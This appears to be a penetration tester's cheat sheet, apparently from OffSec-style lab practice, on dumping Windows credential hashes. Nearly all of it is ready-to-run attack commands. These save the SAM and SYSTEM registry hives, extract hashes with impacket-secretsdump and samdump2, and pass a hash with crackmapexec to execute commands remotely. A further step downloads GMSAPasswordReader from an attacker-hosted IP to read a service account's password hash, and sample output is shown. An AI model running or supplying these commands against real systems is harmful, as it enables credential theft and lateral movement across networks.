## Hash Dumping

### SAM Dumping

```
Dumping the SAM hashes on Victim

reg save hklm\system system
reg save hklm\sam sam

-> Exfiltrate to our Kali machine and use a tool called samdump2 or powershell or mimikatz.

# Methods, not everytime hashes are crackable.
1) impacket-secretsdump -sam sam -system system -security security local # BEST
2) cp /usr/bin/samdump2 .
samdump2 system sam # Less Reliable
3) crackmapexec smb <IP> -u <user> -p <pass> --sam
```

### SAM Hash Cracking

```
# Put DC IP or IP where you want to Pivot, the user is from SAM hash, Modify the hash and remove dots and name.

crackmapexec smb <IP> -u <user> -H aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -x ipconfig
```

### GMSA PAssword

```
https://github.com/rvazarkar/GMSAPasswordReader

GMSAPasswordReader.exe


iwr -uri http://192.168.45.152:9090/GMSAPasswordReader.exe -Outfile GMSAPasswordReader.exe

.\GMSAPasswordReader.exe --accountName 'svc_apache'


Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 4B3F0BF258E6C099A7B800EC37B2D456
```
